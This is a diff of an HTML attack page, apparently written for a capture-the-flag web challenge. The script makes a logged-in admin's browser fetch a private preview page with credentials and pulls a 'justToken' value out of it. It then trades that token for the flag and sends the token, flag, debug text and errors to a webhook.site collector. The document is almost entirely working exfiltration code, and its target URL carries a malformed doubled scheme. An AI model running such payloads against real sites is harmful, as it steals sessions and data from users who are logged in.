@@ -1,39 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Attack - iframe方案</title>
+    <title>Simple Attack</title>
 </head>
 <body>
     <script>
-        fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?step=iframe_start').catch(() => {});
+        // 發送開始信號
+        fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?step=start').catch(() => {});
         
-        // 創建隱藏的iframe
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = 'http://localhost:3000/tasks/preview/0/0';
-        
-        iframe.onload = function() {
-            try {
-                // 嘗試讀取iframe內容
-                const content = iframe.contentDocument.body.textContent;
-                const tokenMatch = content.match(/justToken\{([^}]+)\}/);
-                
-                if (tokenMatch && tokenMatch[1]) {
-                    const token = tokenMatch[1];
-                    fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?iframe_token=' + encodeURIComponent(token))
+        // 等待admin登入
+        setTimeout(() => {
+            // 直接嘗試獲取admin的token頁面
+            fetch('http://http://ay1sqnpo2s0kb38nl1zksw6ypbi8t9.simpletasks.web.jctf.pro/tasks/preview/0/0', {
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                // 檢查是否包含justToken
+                if (data.includes('justToken{')) {
+                    const match = data.match(/justToken\{([^}]+)\}/);
+                    if (match) {
+                        const token = match[1];
+                        // 發送token
+                        fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + token)
+                            .catch(() => {});
+                        
+                        // 嘗試獲取flag
+                        fetch('http://http://ay1sqnpo2s0kb38nl1zksw6ypbi8t9.simpletasks.web.jctf.pro/token?token=' + token)
+                            .then(r => r.text())
+                            .then(flag => {
+                                fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?flag=' + encodeURIComponent(flag))
+                                    .catch(() => {});
+                            })
+                            .catch(() => {});
+                    }
+                } else {
+                    // 發送調試信息
+                    fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?debug=' + encodeURIComponent(data.substring(0, 100)))
                         .catch(() => {});
                 }
-            } catch(e) {
-                fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?iframe_error=' + encodeURIComponent(e.message))
+            })
+            .catch(error => {
+                fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?error=' + encodeURIComponent(error.message))
                     .catch(() => {});
-            }
-        };
-        
-        iframe.onerror = function() {
-            fetch('https://webhook.site/你的webhook地址?iframe_load_error=true').catch(() => {});
-        };
-        
-        document.body.appendChild(iframe);
+            });
+        }, 2000);
     </script>
 </body>
 </html>
